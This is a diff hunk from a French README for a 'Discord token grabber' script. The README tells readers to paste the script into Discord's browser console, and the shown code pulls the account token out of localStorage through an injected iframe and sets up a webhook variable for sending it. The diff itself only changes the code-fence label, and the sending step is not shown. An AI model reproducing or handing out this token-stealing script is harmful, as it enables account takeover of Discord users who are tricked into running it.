@@ -5,7 +5,7 @@ Script Token Grabber en NodeJS
 
 2). Entrer le script dans la console de discord
 
-```
+```nodejs
 location.reload();
 var webhook = "";
 var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token;
